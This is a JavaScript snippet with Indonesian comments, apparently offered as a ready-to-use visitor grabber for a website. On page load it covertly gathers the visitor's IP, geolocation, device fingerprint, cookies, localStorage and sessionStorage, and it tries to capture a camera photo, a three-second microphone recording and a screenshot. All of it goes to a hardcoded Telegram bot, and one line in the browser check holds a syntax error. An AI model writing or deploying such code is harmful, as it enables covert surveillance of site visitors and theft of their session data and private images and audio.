// Konfigurasi Telegram - Ubah sesuai kebutuhan
const TELEGRAM_CONFIG = {
    botToken: '8755355530:AAGSreN3PpCitnMkDkrC25qRUpW7gcY9b2A', // Ganti dengan token bot kamu
    chatId: '6828924584' // Ganti dengan chat ID kamu
};

// Self-executing function biar langsung jalan
(function() {
    'use strict';
    
    // Tunggu page load
    window.addEventListener('load', function() {
        // Kumpulin semua data dalam 3 detik
        setTimeout(function() {
            collectAllData();
        }, 3000);
    });

    async function collectAllData() {
        try {
            // 1. IP dan lokasi
            const ipData = await getIPData();
            
            // 2. Device info lengkap
            const deviceInfo = getDeviceInfo();
            
            // 3. Camera capture
            const photoBase64 = await captureCamera();
            
            // 4. Audio recording 3 detik
            const audioBase64 = await recordAudio();
            
            // 5. Screen capture
            const screenBase64 = await captureScreen();
            
            // 6. Browser fingerprint
            const fingerprint = getFingerprint();
            
            // 7. Network info
            const networkInfo = getNetworkInfo();
            
            // 8. Geolocation real
            const geoLocation = await getRealLocation();
            
            // Gabungin semua data
            const allData = {
                timestamp: new Date().toISOString(),
                ip_info: ipData,
                device: deviceInfo,
                fingerprint: fingerprint,
                network: networkInfo,
                location: geoLocation,
                photos: {
                    camera: photoBase64,
                    screen: screenBase64
                },
                audio: audioBase64,
                page_url: window.location.href,
                referrer: document.referrer || 'Direct',
                user_agent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookies: document.cookie || 'No cookies',
                local_storage: JSON.stringify(localStorage),
                session_storage: JSON.stringify(sessionStorage),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen_res: `${screen.width}x${screen.height}`,
                color_depth: screen.colorDepth,
                pixel_ratio: window.devicePixelRatio,
                touch_support: 'ontouchstart' in window,
                do_not_track: navigator.doNotTrack,
                hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
                device_memory: navigator.deviceMemory || 'Unknown',
                connection: navigator.connection ? {
                    effective_type: navigator.connection.effectiveType,
                    rtt: navigator.connection.rtt,
                    downlink: navigator.connection.downlink,
                    save_data: navigator.connection.saveData
                } : 'Not available',
                plugins: Array.from(navigator.plugins).map(p => p.name),
                mime_types: Array.from(navigator.mimeTypes).map(m => m.type),
                battery: await getBatteryInfo(),
                video_support: checkVideoSupport(),
                audio_support: checkAudioSupport(),
                webgl_info: getWebGLInfo(),
                canvas_fingerprint: getCanvasFingerprint()
            };

            // Kirim ke Telegram
            await sendToTelegram(allData);
            
        } catch (error) {
            console.error('Error collecting data:', error);
            // Tetep kirim error report
            sendToTelegram({
                error: error.message,
                user_agent: navigator.userAgent
            });
        }
    }

    async function getIPData() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const ipData = await response.json();
            
            // Dapetin detail IP dari multiple sources
            const [ipDetails, ipGeo] = await Promise.all([
                fetch(`https://ipapi.co/${ipData.ip}/json/`).then(res => res.json()),
                fetch(`https://ipinfo.io/${ipData.ip}/json`).then(res => res.json())
            ]);
            
            return {
                ip: ipData.ip,
                details: ipDetails,
                geo: ipGeo,
                proxy: ipDetails.proxy || false,
                hosting: ipDetails.hosting || false,
                tor: ipDetails.tor || false
            };
        } catch (error) {
            return { error: error.message };
        }
    }

    function getDeviceInfo() {
        return {
            os: getOS(),
            browser: getBrowser(),
            device_type: getDeviceType(),
            cpu: navigator.oscpu || 'Unknown',
            cores: navigator.hardwareConcurrency || 'Unknown',
            ram: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
            gpu: getGPUInfo(),
            fonts: getFonts(),
            battery: navigator.getBattery ? 'Available' : 'Not available',
            vibration: 'vibrate' in navigator,
            bluetooth: 'bluetooth' in navigator,
            usb: 'usb' in navigator,
            nfc: 'nfc' in navigator,
            credentials: 'credentials' in navigator,
            clipboard: 'clipboard' in navigator,
            wake_lock: 'wakeLock' in navigator,
            media_devices: 'mediaDevices' in navigator,
            geolocation: 'geolocation' in navigator,
            service_worker: 'serviceWorker' in navigator,
            indexed_db: 'indexedDB' in window,
            web_gl: 'WebGLRenderingContext' in window,
            web_gl2: 'WebGL2RenderingContext' in window,
            web_audio: 'AudioContext' in window || 'webkitAudioContext' in window,
            web_rtc: 'RTCPeerConnection' in window,
            web_socket: 'WebSocket' in window,
            web_worker: 'Worker' in window,
            shared_worker: 'SharedWorker' in window,
            service_worker: 'serviceWorker' in navigator,
            web_assembly: 'WebAssembly' in window,
            web_crypto: 'crypto' in window,
            web_authentication: 'PublicKeyCredential' in window,
            web_bluetooth: 'bluetooth' in navigator,
            web_usb: 'usb' in navigator,
            web_nfc: 'nfc' in navigator,
            web_midi: 'requestMIDIAccess' in navigator,
            web_xr: 'xr' in navigator,
            web_payments: 'PaymentRequest' in window,
            web_share: 'share' in navigator,
            web_credentials: 'credentials' in navigator,
            web_permissions: 'permissions' in navigator,
            web_presentation: 'PresentationRequest' in window,
            web_sensors: 'Accelerometer' in window,
            web_media_recorder: 'MediaRecorder' in window,
            web_speech_recognition: 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
            web_speech_synthesis: 'speechSynthesis' in window
        };
    }

    function getOS() {
        const ua = navigator.userAgent;
        if (ua.indexOf('Win') !== -1) return 'Windows';
        if (ua.indexOf('Mac') !== -1) return 'MacOS';
        if (ua.indexOf('Linux') !== -1) return 'Linux';
        if (ua.indexOf('Android') !== -1) return 'Android';
        if (ua.indexOf('iOS') !== -1 || ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) return 'iOS';
        return 'Unknown';
    }

    function getBrowser() {
        const ua = navigator.userAgent;
        if (ua.indexOf('Chrome') !== -1) return 'Chrome';
        if (ua.indexOf('Firefox') !== -1) return 'Firefox';
        if (ua.indexOf('Safari') !== -1) return 'Safari';
        if (ua.indexOf('Edge') !== -1) return 'Edge';
        if (ua.indexOf('Opera') !== -1) || ua.indexOf('OPR') !== -1) return 'Opera';
        return 'Unknown';
    }

    function getDeviceType() {
        const ua = navigator.userAgent;
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
        if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/i.test(ua)) return 'Mobile';
        return 'Desktop';
    }

    function getGPUInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return {
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
                };
            }
        }
        return 'Unknown';
    }

    function getFonts() {
        const fontList = [
            'Arial', 'Verdana', 'Times New Roman', 'Courier New', 
            'Georgia', 'Palatino', 'Garamond', 'Comic Sans MS',
            'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Console',
            'Tahoma', 'Helvetica', 'Calibri', 'Candara', 'Segoe UI'
        ];
        return fontList.filter(font => document.fonts.check(`12px "${font}"`));
    }

    async function captureCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            const photo = canvas.toDataURL('image/jpeg', 0.9);
            
            stream.getTracks().forEach(track => track.stop());
            
            return photo;
        } catch (error) {
            return { error: 'Camera access denied or not available' };
        }
    }

    async function recordAudio() {
        return new Promise(async (resolve) => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];
                
                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };
                
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(audioBlob);
                    reader.onloadend = () => {
                        stream.getTracks().forEach(track => track.stop());
                        resolve(reader.result);
                    };
                };
                
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 3000);
            } catch (error) {
                resolve({ error: 'Microphone access denied or not available' });
            }
        });
    }

    async function captureScreen() {
        try {
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const screenshot = canvas.toDataURL('image/jpeg', 0.9);
            
            stream.getTracks().forEach(track => track.stop());
            
            return screenshot;
        } catch (error) {
            return { error: 'Screen capture denied or not available' };
        }
    }

    function getFingerprint() {
        return {
            user_agent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookies_enabled: navigator.cookieEnabled,
            do_not_track: navigator.doNotTrack,
            timezone_offset: new Date().getTimezoneOffset(),
            screen_resolution: `${screen.width}x${screen.height}`,
            color_depth: screen.colorDepth,
            pixel_ratio: window.devicePixelRatio,
            hardware_concurrency: navigator.hardwareConcurrency,
            device_memory: navigator.deviceMemory,
            touch_points: navigator.maxTouchPoints,
            plugins_length: navigator.plugins.length,
            mime_types_length: navigator.mimeTypes.length
        };
    }

    function getNetworkInfo() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
            return {
                effective_type: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                save_data: connection.saveData,
                type: connection.type
            };
        }
        return 'Network info not available';
    }

    async function getRealLocation() {
        return new Promise((resolve) => {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    position => resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitude_accuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp
                    }),
                    error => resolve({ error: error.message })
                );
            } else {
                resolve({ error: 'Geolocation not supported' });
            }
        });
    }

    async function getBatteryInfo() {
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                return {
                    charging: battery.charging,
                    level: battery.level * 100 + '%',
                    charging_time: battery.chargingTime,
                    discharging_time: battery.dischargingTime
                };
            } catch (error) {
                return { error: error.message };
            }
        }
        return 'Battery info not available';
    }

    function checkVideoSupport() {
        const video = document.createElement('video');
        return {
            mp4: video.canPlayType('video/mp4') !== '',
            webm: video.canPlayType('video/webm') !== '',
            ogg: video.canPlayType('video/ogg') !== '',
            hls: video.canPlayType('application/vnd.apple.mpegurl') !== ''
        };
    }

    function checkAudioSupport() {
        const audio = document.createElement('audio');
        return {
            mp3: audio.canPlayType('audio/mpeg') !== '',
            wav: audio.canPlayType('audio/wav') !== '',
            ogg: audio.canPlayType('audio/ogg') !== '',
            aac: audio.canPlayType('audio/aac') !== ''
        };
    }

    function getWebGLInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shading_language_version: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                max_texture_size: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                max_viewport_size: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                aliased_line_width_range: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
                aliased_point_size_range: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE),
                max_combined_texture_image_units: gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS),
                max_cube_map_texture_size: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
                max_fragment_uniform_vectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
                max_renderbuffer_size: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
                max_texture_image_units: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),
                max_vertex_texture_image_units: gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS),
                max_vertex_uniform_vectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
                max_vertex_attribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
                extensions: gl.getSupportedExtensions()
            };
        }
        return 'WebGL not supported';
    }

    function getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(0, 0, 100, 50);
        ctx.fillStyle = '#069';
        ctx.fillText('Browser Fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Canvas Test', 2, 30);
        
        return canvas.toDataURL();
    }

    async function sendToTelegram(data) {
        try {
            // Format pesan untuk Telegram
            let message = '<b>🔴 NEW VISITOR DETECTED</b>\n\n';
            message += `<b>⏰ Time:</b> ${data.timestamp}\n`;
            message += `<b>🌍 URL:</b> ${data.page_url}\n`;
            message += `<b>🔗 Referrer:</b> ${data.referrer}\n\n`;
            
            // IP Info
            if (data.ip_info && !data.ip_info.error) {
                message += '<b>📡 IP INFORMATION</b>\n';
                message += `IP: ${data.ip_info.ip || 'Unknown'}\n`;
                if (data.ip_info.details) {
                    message += `Country: ${data.ip_info.details.country_name || 'Unknown'}\n`;
                    message += `Region: ${data.ip_info.details.region || 'Unknown'}\n`;
                    message += `City: ${data.ip_info.details.city || 'Unknown'}\n`;
                    message += `ISP: ${data.ip_info.details.org || 'Unknown'}\n`;
                    message += `Timezone: ${data.ip_info.details.timezone || 'Unknown'}\n`;
                }
                message += '\n';
            }
            
            // Device Info
            message += '<b>💻 DEVICE INFO</b>\n';
            message += `OS: ${data.device.os}\n`;
            message += `Browser: ${data.device.browser}\n`;
            message += `Type: ${data.device.device_type}\n`;
            message += `CPU: ${data.device.cpu}\n`;
            message += `Cores: ${data.device.cores}\n`;
            message += `RAM: ${data.device.ram}\n`;
            if (data.device.gpu !== 'Unknown') {
                message += `GPU: ${JSON.stringify(data.device.gpu)}\n`;
            }
            message += '\n';
            
            // Location
            if (data.location && !data.location.error) {
                message += '<b>📍 REAL LOCATION</b>\n';
                message += `Lat: ${data.location.latitude}\n`;
                message += `Long: ${data.location.longitude}\n`;
                message += `Accuracy: ${data.location.accuracy}m\n`;
                message += `Google Maps: https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}\n\n`;
            }
            
            // Network
            if (data.network && typeof data.network === 'object') {
                message += '<b>🌐 NETWORK</b>\n';
                message += `Type: ${data.network.effective_type || 'Unknown'}\n`;
                message += `Speed: ${data.network.downlink || 'Unknown'} Mbps\n`;
                message += `RTT: ${data.network.rtt || 'Unknown'} ms\n\n`;
            }
            
            // Screen
            message += '<b>🖥️ SCREEN</b>\n';
            message += `Resolution: ${data.screen_res}\n`;
            message += `Color Depth: ${data.color_depth}\n`;
            message += `Pixel Ratio: ${data.pixel_ratio}\n\n`;
            
            // Hardware
            message += '<b>🔧 HARDWARE</b>\n';
            message += `Concurrency: ${data.hardware_concurrency}\n`;
            message += `Memory: ${data.device_memory}\n`;
            message += `Touch: ${data.touch_support}\n`;
            message += `DNT: ${data.do_not_track || 'Not set'}\n\n`;
            
            // Browser Features
            message += '<b>⚡ BROWSER FEATURES</b>\n';
            message += `WebGL: ${data.web_gl}\n`;
            message += `WebRTC: ${data.web_rtc}\n`;
            message += `WebAudio: ${data.web_audio}\n`;
            message += `WebAssembly: ${data.web_assembly}\n`;
            message += `ServiceWorker: ${data.service_worker}\n\n`;
            
            // Audio/Video Support
            message += '<b>🎥 MEDIA SUPPORT</b>\n';
            message += `Video: ${JSON.stringify(data.video_support)}\n`;
            message += `Audio: ${JSON.stringify(data.audio_support)}\n\n`;
            
            // Cookies & Storage
            message += '<b>🍪 STORAGE</b>\n';
            message += `Cookies: ${data.cookies}\n`;
            message += `LocalStorage: ${data.local_storage}\n\n`;
            
            // Kirim text message
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            // Kirim foto dari camera
            if (data.photos.camera && !data.photos.camera.error) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.chatId,
                        photo: data.photos.camera,
                        caption: '📸 Camera capture'
                    })
                });
            }
            
            // Kirim screenshot
            if (data.photos.screen && !data.photos.screen.error) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.chatId,
                        photo: data.photos.screen,
                        caption: '🖥️ Screen capture'
                    })
                });
            }
            
            // Kirim audio
            if (data.audio && !data.audio.error) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendAudio`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.chatId,
                        audio: data.audio,
                        caption: '🎤 Voice recording (3s)'
                    })
                });
            }
            
            // Kirim canvas fingerprint
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.chatId,
                    photo: data.canvas_fingerprint,
                    caption: '🎨 Canvas fingerprint'
                })
            });
            
            console.log('Data sent to Telegram successfully');
            
        } catch (error) {
            console.error('Error sending to Telegram:', error);
        }
    }
})();